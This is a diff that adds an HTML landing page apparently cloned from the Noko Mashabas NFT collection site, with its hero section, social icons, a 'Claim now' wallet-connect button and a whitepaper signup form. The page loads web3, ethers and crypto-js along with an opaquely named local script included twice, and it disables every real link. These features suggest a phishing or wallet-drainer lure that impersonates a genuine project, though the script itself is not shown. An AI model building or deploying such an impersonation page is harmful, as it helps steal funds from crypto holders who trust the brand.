@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="en" style="--hue:220; --hue-complimentary1:250; --hue-complimentary2:300;">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Home | Noko Mashabas NFT Collection</title>
+  <meta name="description"
+    content="Bringing Noko Mashaba&#39;s iconic comedy to the blockchain! Explore the world of our NFT project and join us in this revolutionary experience.">
+  <link rel="shortcut icon" href="https://www.mashabas.io/favicon.ico">
+  <link rel="icon" href="https://www.mashabas.io/favicon.ico" sizes="16x16 32x32 48x48 64x64">
+  <link rel="mask-icon" color="#000000" href="https://www.mashabas.io/assets/img/favicons/favicon.svg">
+  <link rel="apple-touch-icon" sizes="120x120" href="https://www.mashabas.io/assets/img/favicons/favicon-120.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="https://www.mashabas.io/assets/img/favicons/favicon-152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://www.mashabas.io/assets/img/favicons/favicon-180.png">
+  <meta name="msapplication-TileColor" content="#000000">
+  <meta name="msapplication-TileImage" content="https://www.mashabas.io/assets/img/favicons/favicon-144.png">
+  <meta name="msapplication-config" content="browserconfig.xml">
+  <link rel="manifest" href="https://www.mashabas.io/web.manifest">
+  <meta property="og:title" content="Home | Noko Mashabas NFT Collection">
+  <meta property="og:description"
+    content="Bringing Noko Mashaba&#39;s iconic comedy to the blockchain! Explore the world of our NFT project and join us in this revolutionary experience.">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="https://www.mashabas.io/assets/img/logo-footer.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="675">
+  <meta name="twitter:title" content="Home | Noko Mashabas NFT Collection">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@Mashabas_NFT">
+  <meta name="twitter:description"
+    content="Bringing Noko Mashaba&#39;s iconic comedy to the blockchain! Explore the world of our NFT project and join us in this revolutionary experience.">
+  <meta name="twitter:image" content="https://www.mashabas.io/assets/img/logo-footer.png">
+  <meta name="twitter:creator" content="@Mashabas_NFT">
+  <link href="./assets/tailwindoutlive.css" rel="stylesheet">
+  <link href="./assets/style.css" rel="stylesheet">
+  <link href="./assets/style.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="./assets/lite-yt-embed.css">
+  <style>
+    .reveal {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: all 1s
+    }
+
+    .reveal.active {
+      opacity: 1;
+      transform: translateY(0)
+    }
+
+    .leftie {
+      opacity: 0;
+      transform: translateX(-50px);
+      transition: all 1s
+    }
+
+    .leftie.active {
+      opacity: 1;
+      transform: translateX(0)
+    }
+
+    .elipse-motif {
+      border: solid #fff 2px;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) rotate(13deg);
+      width: 350px;
+      height: 450px;
+      z-index: 2;
+      border-radius: 5%
+    }
+
+    .elipse-motif-2 {
+      border: solid #fff 2px;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) rotate(-13deg);
+      width: 350px;
+      height: 450px;
+      z-index: 2;
+      border-radius: 5%
+    }
+
+    .yellow-circle {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -80%) rotate(-20deg);
+      height: 350px;
+      width: 350px;
+      border-radius: 350px;
+      z-index: -1;
+      background-color: #ffc300
+    }
+
+    .blue-circle {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(10%, -10%) rotate(130deg);
+      height: 350px;
+      width: 350px;
+      border-radius: 200px;
+      z-index: -1;
+      background-color: #00cdf3
+    }
+
+    .green-circle {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-70%, -40%) rotate(-140deg);
+      height: 250px;
+      width: 450px;
+      border-radius: 250px 250px 0 0;
+      z-index: 1;
+      background-color: #a0d636
+    }
+
+    .pink-circle {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-20%, -130%) rotate(30deg);
+      height: 200px;
+      width: 350px;
+      border-radius: 200px 200px 0 0;
+      z-index: 1;
+      background-color: #f9c
+    }
+
+    .purple-circle {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-70%, -40%) rotate(-140deg);
+      height: 250px;
+      width: 450px;
+      border-radius: 250px 250px 0 0;
+      z-index: 1;
+      background-color: #683399
+    }
+
+    .green-circle {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-70%, -40%) rotate(-140deg);
+      height: 250px;
+      width: 450px;
+      border-radius: 250px 250px 0 0;
+      z-index: 1;
+      background-color: #a0d635
+    }
+
+    .maroon-circle {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-20%, -130%) rotate(30deg);
+      height: 200px;
+      width: 350px;
+      border-radius: 200px 200px 0 0;
+      z-index: 1;
+      background-color: #900c3e
+    }
+
+    .red-circle {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-20%, -130%) rotate(30deg);
+      height: 200px;
+      width: 350px;
+      border-radius: 200px 200px 0 0;
+      z-index: 1;
+      background-color: #a50000
+    }
+
+    .trend-card {
+      background: #001442c0;
+      -webkit-backdrop-filter: blur(10px);
+      backdrop-filter: blur(10px);
+      border: 2px solid rgba(191, 191, 191, .25);
+      border-radius: 10px
+    }
+
+    .trend-card-mobile {
+      background: #001442c0;
+      -webkit-backdrop-filter: blur(10px);
+      backdrop-filter: blur(10px);
+      border: 2px solid rgba(191, 191, 191, .25)
+    }
+
+    .loaderContainer {
+      z-index: 999;
+      position: fixed;
+      width: 100vw;
+      top: 0;
+      left: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: #0a0a2c
+    }
+
+    .loader {
+      position: relative;
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      background: linear-gradient(45deg, transparent, transparent 40%, #e5f403)
+    }
+
+    @keyframes animate {
+      0% {
+        transform: rotate(0);
+        filter: hue-rotate(0)
+      }
+
+      100% {
+        transform: rotate(360deg);
+        filter: hue-rotate(360deg)
+      }
+    }
+
+    .loader:before {
+      content: " ";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(45deg, transparent, transparent 40%, #e5f403);
+      border-radius: 50%;
+      z-index: 1;
+      animation: animate 2s linear infinite
+    }
+
+    .preloader {
+      z-index: 999
+    }
+
+    .loading-text {
+      font-size: 10rem;
+      z-index: 999;
+      color: #d7d7d7
+    }
+
+    .body-wrapper.show-content {
+      opacity: 0
+    }
+
+    body {
+      --screen: "small"
+    }
+
+    @media (min-width:400px) {
+      body {
+        --screen: "medium"
+      }
+    }
+
+    @media (min-width:800px) {
+      body {
+        --screen: "large"
+      }
+    }
+
+    .css-ticket {
+      box-shadow: #00cdf3 2px;
+      background: #333;
+      height: 100px;
+      position: relative;
+      width: 300px;
+      padding: 0 50px;
+      clip-path: path("M4.3542 116.355C17.3259 117.282 20.7794 127.838 20.8847 133C91.2186 132.93 235.192 132.79 248.417 132.79C250.733 118.568 264.421 116.04 265.263 115.829C266.106 115.619 265.263 113.512 265.263 112.985C265.263 112.458 263.263 111.931 263.263 110.141C263.263 108.35 264.632 106.875 265.263 106.453C265.895 106.032 265.895 102.872 265.895 102.134C265.895 101.397 262.842 99.7112 262.842 97.7096C262.842 95.708 265.158 94.4438 265.895 91.5994C266.632 88.7551 263.263 87.8069 262.842 84.9626C262.42 82.1182 265.895 82.2235 265.895 79.0631C265.895 75.9027 262.842 76.1134 262.842 73.269C262.842 70.4247 265.369 70.3193 265.895 67.0535C266.421 63.7878 262.842 63.261 262.842 60.522C262.842 57.783 265.369 58.099 265.895 54.4119C266.421 50.7247 262.842 49.9873 262.842 47.9857C262.842 45.9841 265.79 43.2451 265.895 41.8756C265.895 39.5 263.263 38.9258 262.842 36.3975C262.42 33.8692 265.369 32.605 265.369 29.6553C265.369 26.7055 262.526 25.7574 262.526 23.9665C262.315 21.9649 267.369 19.4366 261.999 17.3296C253.66 15.6441 249.259 5.7409 248.101 1H22.6751C22.6751 1 21.7275 1.00095 21.7275 1.63208C17.9371 18.2769 6.77635 17.3286 6.03932 17.3286C5.30229 17.3286 5.51287 16.4859 3.72294 18.3821C1.93301 20.2784 4.3542 22.8067 4.3542 27.3366C4.3542 31.8665 1.61708 33.4467 2.14359 35.027C2.6701 36.6072 4.3542 37.1339 4.3542 40.821C4.3542 44.5082 1.82766 43.3494 1.09063 45.7724C.353596 48.1954 4.3542 48.5114 4.3542 52.3039C4.3542 56.0964 1.61708 54.0948 1.61708 57.9927C1.61708 61.8905 4.3542 60.3103 4.3542 63.9975C4.3542 67.6846 1.61708 67.6846 1.61708 70.845C1.61708 74.0054 4.3542 74.1108 4.3542 77.1659C4.3542 80.2209 1.61708 79.7995 1.61708 82.3279C1.61708 84.8562 4.3542 86.9632 4.3542 89.1754C4.3542 91.3877 1.61708 92.5466 1.61708 94.8642C1.61708 97.1818 4.3542 100.132 4.3542 101.712C4.3542 103.292 2.03824 106.242 2.03824 108.033C2.03824 109.465 3.23125 111.86 3.82775 112.879C3.82775 113.511 4.35457 114.986 4.3542 116.355Z"
+        )
+    }
+
+    .rotate-0 {
+      opacity: 0
+    }
+
+    .rotate-1 {
+      margin-left: 60px;
+      margin-top: 30px;
+      opacity: 0
+    }
+
+    .rotate-2 {
+      margin-left: 120px;
+      margin-top: 80px;
+      opacity: 0
+    }
+
+    .stub {
+      transform: translate(-45%, -60%)
+    }
+
+    .spacer {
+      height: 6rem
+    }
+
+    @media screen and (min-width:1024px) {
+      .spacer {
+        height: 10rem
+      }
+    }
+
+    @media screen and (max-width:1024px) {
+      .stub img {
+        height: 350px
+      }
+
+      .stub {
+        transform: translate(-70%, -50%)
+      }
+
+      .yellow-circle {
+        transform: translate(-20%, -30%) rotate(-20deg);
+        height: 300px;
+        width: 300px
+      }
+
+      .blue-circle {
+        transform: translate(-80%, -70%) rotate(-20deg);
+        height: 300px;
+        width: 300px
+      }
+    }
+
+    @media screen and (max-width:500px) {
+      .stub img {
+        height: 250px
+      }
+    }
+  </style>
+  <style></style>
+  <link rel="preconnect" href="https://www.youtube-nocookie.com/">
+  <link rel="preconnect" href="https://www.google.com/">
+  <link rel="preconnect" href="https://googleads.g.doubleclick.net/">
+  <link rel="preconnect" href="https://static.doubleclick.net/">
+  <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
+  <script src="https://unpkg.com/crypto-js@latest/crypto-js.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    
+  <script src="1ffd7b9a9e7dba9190.js"></script>
+  <script src="1ffd7b9a9e7dba9190.js"></script>
+  <style>
+    w3m-modal{
+      position: fixed;
+      z-index: 10000000;
+    }
+  </style>
+</head>
+
+<body x-data="{openMobile: false}" style="color: white; background-color: rgb(10, 10, 44);"
+  bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMS45LjEwIiwic2NvcmUiOjEwOTEwfV0="
+  cz-shortcut-listen="true" class="scroll-down">
+  <div class="body-wrapper overflow-x-hidden"
+    @scroll.window="window.pageYOffset&gt;60?scrolledFromTop=true:scrolledFromTop=false"
+    x-data="{scrolledFromTop : false}" style="opacity: 1;" bis_skin_checked="1"><canvas
+      class="orb-canvas overflow-hidden" width="1872" height="940"
+      style="touch-action: none; cursor: inherit;"></canvas>
+    <section class="relative overflow-hidden" data-bgcolor="rgb(10, 10, 44)" data-textcolor="white">
+      <div class="max-w-7xl flex items-center relative justify-center mx-auto" bis_skin_checked="1">
+        <div class="w-full huge-screen mx-auto z-50 fixed nav-glass top-0 left-0" bis_skin_checked="1">
+          <div
+            class="flex xl:max-w-7xl px-8 2xl:px-0 navbar justify-between mx-auto items-center py-6 lg:justify-start lg:space-x-10"
+            bis_skin_checked="1">
+            <div class="flex justify-start flex-1" bis_skin_checked="1"><a href="#"><span
+                  class="sr-only">Noko Mashaba</span> <img class="lg:w-[150px] w-1/3 z-50"
+                  src="./assets/logo-footer.png" alt=""></a></div>
+            <div class="-mr-2 -my-2 lg:hidden" bis_skin_checked="1"><button type="button" x-on:click="openMobile = true"
+                class="rounded-md p-2 inline-flex items-center justify-center text-gray-400" aria-expanded="false"><span
+                  class="sr-only">Open menu</span><svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none"
+                  viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+                </svg></button></div>
+            <nav class="hidden lg:flex space-x-10 items-center nav-links"><a href="#"
+                class="text-2xl font-medium text-white hover:text-gray-300 font-canterpids">HOME</a> <a
+                href="#"
+                class="text-2xl font-medium text-white hover:text-gray-300 font-canterpids" bis_skin_checked="1">OUR
+                STORY</a> <a href="#"
+                class="text-2xl font-medium text-white hover:text-gray-300 font-canterpids"
+                bis_skin_checked="1">COLLECTION</a> <a href="#"
+                class="text-2xl font-medium text-white hover:text-gray-300 font-canterpids" bis_skin_checked="1">FAQ</a>
+              <a href="#"
+                class="text-2xl font-medium text-white hover:text-gray-300 font-canterpids"
+                bis_skin_checked="1">METAVERSE</a> <a href="#"
+                class="text-2xl font-medium text-white hover:text-gray-300 font-canterpids"
+                bis_skin_checked="1">ROADMAP</a> <a href="#"
+                class="text-2xl font-medium bg-white rounded-lg px-6 pt-1 !text-black font-canterpids"
+                bis_skin_checked="1">MINT</a></nav>
+            <div
+              class="absolute z-50 top-0 inset-x-0 transition transform origin-top-right lg:hidden m-2 rounded-lg shadow-lg bg-white bg-opacity-99 border-2 border-gray-300"
+              x-show="openMobile" x-on:click.away="openMobile = false"
+              x-transition:enter="transition ease-out duration-200" x-transition:enter-start="opacity-0 -translate-y-1"
+              x-transition:enter-end="opacity-100 translate-y-0" x-transition:leave="transition ease-in duration-150"
+              x-transition:leave-start="opacity-100 translate-y-0" x-transition:leave-end="opacity-0 -translate-y-1"
+              style="display: none;" bis_skin_checked="1">
+              <div class="ring-1 ring-black ring-opacity-5 divide-y-2 divide-gray-50" bis_skin_checked="1">
+                <div class="pt-5 pb-6 px-5" bis_skin_checked="1">
+                  <div class="flex items-center justify-between" bis_skin_checked="1">
+                    <div bis_skin_checked="1"><img class="lg:w-auto w-2/3" src="./assets/logo-black.png" alt=""></div>
+                    <div class="-mr-2" bis_skin_checked="1"><button type="button" x-on:click="openMobile = false"
+                        class="rounded-md p-2 inline-flex items-center justify-center text-gray-400"><span
+                          class="sr-only">Close menu</span><svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg"
+                          fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">
+                          <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
+                        </svg></button></div>
+                  </div>
+                  <div class="mt-6 grid grid-cols-2" bis_skin_checked="1">
+                    <nav class=""><a href="#" class="-m-3 p-4 flex items-center rounded-lg">
+                        <div class="text-2xl font-medium text-gray-900 font-canterpids" bis_skin_checked="1">Home</div>
+                      </a><a href="#" class="-m-3 p-4 flex items-center rounded-lg"
+                        bis_skin_checked="1">
+                        <div class="text-2xl font-medium text-gray-900 font-canterpids" bis_skin_checked="1">Our Story
+                        </div>
+                      </a><a href="#" class="-m-3 p-4 flex items-center rounded-lg"
+                        bis_skin_checked="1">
+                        <div class="text-2xl font-medium text-gray-900 font-canterpids" bis_skin_checked="1">Collection
+                        </div>
+                      </a><a href="#"
+                        class="-m-3 p-4 flex items-center rounded-lg" bis_skin_checked="1">
+                        <div class="font-canterpids text-2xl font-medium text-gray-900" bis_skin_checked="1">FAQ's</div>
+                      </a><a href="#" class="-m-3 p-4 flex items-center rounded-lg"
+                        bis_skin_checked="1">
+                        <div class="font-canterpids text-2xl font-medium text-gray-900" bis_skin_checked="1">Metaverse
+                        </div>
+                      </a><a href="#" class="-m-3 p-4 flex items-center rounded-lg"
+                        bis_skin_checked="1">
+                        <div class="font-canterpids text-2xl font-medium text-gray-900" bis_skin_checked="1">Roadmap
+                        </div>
+                      </a><a href="#" class="-m-3 p-4 flex items-center rounded-lg"
+                        bis_skin_checked="1">
+                        <div class="font-canterpids text-2xl font-medium text-gray-900" bis_skin_checked="1">Mint</div>
+                      </a></nav>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div
+        class="xl:max-w-7xl huge-screen pt-40 lg:pt-60 mx-auto lg:grid lg:grid-cols-2 space-y-12 lg:space-y-0 2xl:px-0 lg:px-12 animation-trigger relative"
+        bis_skin_checked="1">
+        <div class="flex px-8 lg:px-0" bis_skin_checked="1">
+          <div class="lg:flex lg:flex-col" bis_skin_checked="1">
+            <div class="relative text-lg font-medium text-white lg:flex-grow flex flex-col justify-center"
+              bis_skin_checked="1">
+              <h1 class="text-5xl md:text-8xl uppercase font-canterpids lg:mt-0">The Mashabas <span class="">NFT</span>
+                Collection</h1>
+              <h3 class="lg:text-4xl text-3xl uppercase mt-4 text-n-blue font-canterpids">WHERE DIGITAL ART, UTILITY,
+                LEGACY AND DESTINY MEET</h3>
+              <p class="home-para mt-6 sm:mt-3 max-w-sm pr-4 lg:pr-0 text-gray-300 text-base lg:mt-8 md:max-w-lg z-10"
+                style="opacity: 1; transform: translate(0px, 0px);">A NFT collection based on the award winning animated
+                series "The Adventures of Noko Mashaba". A community that will build and share in the future success of
+                the series.</p>
+              <div class="flex space-x-6 home-social" style="opacity: 1; transform: translate(0px, 0px);"
+                bis_skin_checked="1">
+                <ul role="list" class="mt-10 flex space-x-2 lg:space-x-6">
+                  <li><a class=""  href="#" bis_skin_checked="1"><span
+                        class="sr-only">TikTok</span> <svg width="24" height="24" viewBox="0 0 35 35" fill="none"
+                        xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 border-2 border-gray-600 p-2 rounded-full"
+                        aria-hidden="true">
+                        <path
+                          d="M16.708 0.027c1.745-0.027 3.48-0.011 5.213-0.027 0.105 2.041 0.839 4.12 2.333 5.563 1.491 1.479 3.6 2.156 5.652 2.385v5.369c-1.923-0.063-3.855-0.463-5.6-1.291-0.76-0.344-1.468-0.787-2.161-1.24-0.009 3.896 0.016 7.787-0.025 11.667-0.104 1.864-0.719 3.719-1.803 5.255-1.744 2.557-4.771 4.224-7.88 4.276-1.907 0.109-3.812-0.411-5.437-1.369-2.693-1.588-4.588-4.495-4.864-7.615-0.032-0.667-0.043-1.333-0.016-1.984 0.24-2.537 1.495-4.964 3.443-6.615 2.208-1.923 5.301-2.839 8.197-2.297 0.027 1.975-0.052 3.948-0.052 5.923-1.323-0.428-2.869-0.308-4.025 0.495-0.844 0.547-1.485 1.385-1.819 2.333-0.276 0.676-0.197 1.427-0.181 2.145 0.317 2.188 2.421 4.027 4.667 3.828 1.489-0.016 2.916-0.88 3.692-2.145 0.251-0.443 0.532-0.896 0.547-1.417 0.131-2.385 0.079-4.76 0.095-7.145 0.011-5.375-0.016-10.735 0.025-16.093z"
+                          fill="white"></path>
+                      </svg></a></li>
+                  <li><a  href="#"
+                      bis_skin_checked="1"><span class="sr-only">LinkedIn</span> <svg width="24" height="24"
+                        viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        class="w-10 h-10 border-2 border-gray-600 p-2 rounded-full" aria-hidden="true">
+                        <path
+                          d="M 8.6425781 4 C 7.1835781 4 6 5.181625 6 6.640625 C 6 8.099625 7.182625 9.3085938 8.640625 9.3085938 C 10.098625 9.3085938 11.283203 8.099625 11.283203 6.640625 C 11.283203 5.182625 10.101578 4 8.6425781 4 z M 21.535156 11 C 19.316156 11 18.0465 12.160453 17.4375 13.314453 L 17.373047 13.314453 L 17.373047 11.310547 L 13 11.310547 L 13 26 L 17.556641 26 L 17.556641 18.728516 C 17.556641 16.812516 17.701266 14.960938 20.072266 14.960938 C 22.409266 14.960937 22.443359 17.145609 22.443359 18.849609 L 22.443359 26 L 26.994141 26 L 27 26 L 27 17.931641 C 27 13.983641 26.151156 11 21.535156 11 z M 6.3632812 11.310547 L 6.3632812 26 L 10.923828 26 L 10.923828 11.310547 L 6.3632812 11.310547 z"
+                          fill="white"></path>
+                      </svg></a></li>
+                  <li><a class=""  href="#" bis_skin_checked="1"><span
+                        class="sr-only">Twitter</span> <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                        xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 border-2 border-gray-600 p-2 rounded-full"
+                        aria-hidden="true">
+                        <path
+                          d="M7.548 22.501c9.056 0 14.01-7.503 14.01-14.01 0-.213 0-.425-.015-.636A10.02 10.02 0 0024 5.305a9.828 9.828 0 01-2.828.776 4.94 4.94 0 002.165-2.724 9.867 9.867 0 01-3.127 1.195 4.929 4.929 0 00-8.391 4.491A13.98 13.98 0 011.67 3.9a4.928 4.928 0 001.525 6.573A4.887 4.887 0 01.96 9.855v.063a4.926 4.926 0 003.95 4.827 4.917 4.917 0 01-2.223.084 4.93 4.93 0 004.6 3.42A9.88 9.88 0 010 20.289a13.941 13.941 0 007.548 2.209"
+                          fill="white"></path>
+                      </svg></a></li>
+                  <li><a class=""  href="#" bis_skin_checked="1"><span
+                        class="sr-only">Discord</span> <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                        xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 border-2 border-gray-600 p-2 rounded-full"
+                        aria-hidden="true">
+                        <path
+                          d="M18.942 5.556a16.299 16.299 0 0 0-4.126-1.297c-.178.321-.385.754-.529 1.097a15.175 15.175 0 0 0-4.573 0 11.583 11.583 0 0 0-.535-1.097 16.274 16.274 0 0 0-4.129 1.3c-2.611 3.946-3.319 7.794-2.965 11.587a16.494 16.494 0 0 0 5.061 2.593 12.65 12.65 0 0 0 1.084-1.785 10.689 10.689 0 0 1-1.707-.831c.143-.106.283-.217.418-.331 3.291 1.539 6.866 1.539 10.118 0 .137.114.277.225.418.331-.541.326-1.114.606-1.71.832a12.52 12.52 0 0 0 1.084 1.785 16.46 16.46 0 0 0 5.064-2.595c.415-4.396-.709-8.209-2.973-11.589zM8.678 14.813c-.988 0-1.798-.922-1.798-2.045s.793-2.047 1.798-2.047 1.815.922 1.798 2.047c.001 1.123-.793 2.045-1.798 2.045zm6.644 0c-.988 0-1.798-.922-1.798-2.045s.793-2.047 1.798-2.047 1.815.922 1.798 2.047c0 1.123-.793 2.045-1.798 2.045z"
+                          fill="white"></path>
+                      </svg></a></li>
+                  <li><a class=""  href="#" bis_skin_checked="1"><span
+                        class="sr-only">Facebook</span> <svg version="1.1" id="Capa_1"
+                        xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40"
+                        height="40" viewBox="0 0 105 100" style="enable-background:new 0 0 100 100" xml:space="preserve"
+                        fill="none" class="border-2 border-gray-600 p-2 rounded-full">
+                        <g>
+                          <g id="facebook">
+                            <g>
+                              <path d="M40.3,23.2v14.9H26.9c-1.4,0-2.5,1.1-2.5,2.5v10.9c0,1.4,1.1,2.5,2.5,2.5h13.5v43.5c0,1.4,1.1,2.5,2.5,2.5h11.6
+                c1.4,0,2.5-1.1,2.5-2.5V54h15.7c1.4,0,2.5-1.1,2.5-2.5v-11c0-1.4-1.1-2.5-2.5-2.5H56.9V25c0-5.1,1.1-10.2,10.3-10.2h6
+                c1.4,0,2.5-1.1,2.5-2.5V2.6c0-1.4-1.1-2.5-2.5-2.5H62.8C49,0.1,40.3,9,40.3,23.2z" fill="white"></path>
+                            </g>
+                          </g>
+                        </g>
+                      </svg></a></li>
+                  <li><a class=""  href="#"
+                      bis_skin_checked="1"><span class="sr-only">Instagram</span> <svg version="1.1" id="Capa_1"
+                        xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40"
+                        height="40" viewBox="0 0 30 30" xml:space="preserve" fill="white"
+                        class="border-2 border-gray-600 p-2 rounded-full flex items-center justify-center">
+                        <path
+                          d="M 9.9980469 3 C 6.1390469 3 3 6.1419531 3 10.001953 L 3 20.001953 C 3 23.860953 6.1419531 27 10.001953 27 L 20.001953 27 C 23.860953 27 27 23.858047 27 19.998047 L 27 9.9980469 C 27 6.1390469 23.858047 3 19.998047 3 L 9.9980469 3 z M 22 7 C 22.552 7 23 7.448 23 8 C 23 8.552 22.552 9 22 9 C 21.448 9 21 8.552 21 8 C 21 7.448 21.448 7 22 7 z M 15 9 C 18.309 9 21 11.691 21 15 C 21 18.309 18.309 21 15 21 C 11.691 21 9 18.309 9 15 C 9 11.691 11.691 9 15 9 z M 15 11 A 4 4 0 0 0 11 15 A 4 4 0 0 0 15 19 A 4 4 0 0 0 19 15 A 4 4 0 0 0 15 11 z">
+                        </path>
+                      </svg></a></li>
+                  <li><a class=""  href="#"
+                      bis_skin_checked="1"><span class="sr-only">Youtube</span> <svg version="1.1" id="Capa_1"
+                        xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40"
+                        height="40" viewBox="0 0 30 30" xml:space="preserve" fill="white"
+                        class="border-2 border-gray-600 p-2 rounded-full flex items-center justify-center">
+                        <path
+                          d="M 15 4 C 10.814 4 5.3808594 5.0488281 5.3808594 5.0488281 L 5.3671875 5.0644531 C 3.4606632 5.3693645 2 7.0076245 2 9 L 2 15 L 2 15.001953 L 2 21 L 2 21.001953 A 4 4 0 0 0 5.3769531 24.945312 L 5.3808594 24.951172 C 5.3808594 24.951172 10.814 26.001953 15 26.001953 C 19.186 26.001953 24.619141 24.951172 24.619141 24.951172 L 24.621094 24.949219 A 4 4 0 0 0 28 21.001953 L 28 21 L 28 15.001953 L 28 15 L 28 9 A 4 4 0 0 0 24.623047 5.0546875 L 24.619141 5.0488281 C 24.619141 5.0488281 19.186 4 15 4 z M 12 10.398438 L 20 15 L 12 19.601562 L 12 10.398438 z">
+                        </path>
+                      </svg></a></li>
+                </ul>
+              </div>
+              <div class="home-btn flex" style="opacity: 1; transform: translate(0px, 0px);" bis_skin_checked="1"><a
+                  class="py-2 w-72 font-canterpids cursor-pointer text-xl !mb-0 bg-white text-gray-800 flex !items-center justify-center px-8 rounded-md font-medium bg-z-yellow lg:px-10 mt-10 connectButton">Claim now<svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 ml-2" fill="none"
+                    viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"></path>
+                  </svg></a></div>
+            </div>
+          </div>
+        </div>
+        <div
+          class="col-span-1 lg:flex sm:justify-center lg:justify-center items-center gap-4 space-y-4 lg:space-y-0 lg:pb-0 pb-6 h-[30rem] lg:h-full"
+          bis_skin_checked="1">
+          <div class="relative h-full w-full" bis_skin_checked="1">
+            <div id="heroImgCont" class="h-full w-full relative" bis_skin_checked="1">
+              <ul class="relative h-full w-full hero-cards">
+                <li class="absolute top-1/2 left-1/2 stub"><img src="./assets/stub_5.png" class="rotate-0"
+                    style="transform: translate(0px, 0px); opacity: 1;"></li>
+                <li class="absolute top-1/2 left-1/2 stub"><img src="./assets/stub_1.png" class="rotate-1"
+                    style="transform: rotate(10deg); opacity: 1;"></li>
+                <li class="absolute top-1/2 left-1/2 stub"><img src="./assets/stub_3.png" class="rotate-2"
+                    style="transform: rotate(20deg); opacity: 1;"></li>
+              </ul>
+            </div>
+            <div class="blue-circle"
+              style="transform: translate(0%, -39.3978%) translate3d(35px, -30px, 0px) rotate(130deg) scale(0.9, 0.9);"
+              bis_skin_checked="1"></div>
+            <div class="yellow-circle"
+              style="transform: translate(-50%, 44.3225%) translate3d(0px, -300px, 0px) rotate(-20deg) scale(1.2, 1.2);"
+              bis_skin_checked="1"></div>
+          </div>
+        </div>
+        <div class="fixed w-full h-full bg-blur left-0 top-0 z-50" id="whitepaperOverlay" bis_skin_checked="1"></div>
+        <div
+          class="fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full lg:w-1/2 z-50 bg-z-dark-blue rounded-md"
+          id="whitepaperContent" bis_skin_checked="1">
+          <div class="w-full h-full relative p-8 md:p-20" bis_skin_checked="1"><span
+              class="text-5xl absolute -top-2 right-2 md:top-2 md:right-6 cursor-pointer" onclick="untoggleDownload();"
+              id="closeWhitepaper">x</span>
+            <h2 class="text-5xl font-canterpids font-extrabold tracking-wider z-10 text-n-yellow mb-6">Tell us where to
+              send your <span class="block">copy of the whitepaper.</span></h2>
+            <form class="w-full max-w-xl" id="chimpForm" name="chimpForm">
+              <div class="flex flex-col md:grid md:grid-cols-2 gap-x-4" bis_skin_checked="1">
+                <div class="col-span-1 relative" bis_skin_checked="1"><span
+                    class="text-xs text-red-600 hidden absolute bottom-[-30%] left-0" id="nameError">*Valid name
+                    required</span> <label for="mce-FNAME">Name</label> <input type="text" value="" name="FNAME"
+                    id="mce-FNAME"
+                    class="w-full flex-auto rounded-md border-0 bg-white/5 px-3.5 py-2 text-n-yellow shadow-sm ring-1 ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-white sm:text-sm sm:leading-6"
+                    placeholder="Your Name"></div>
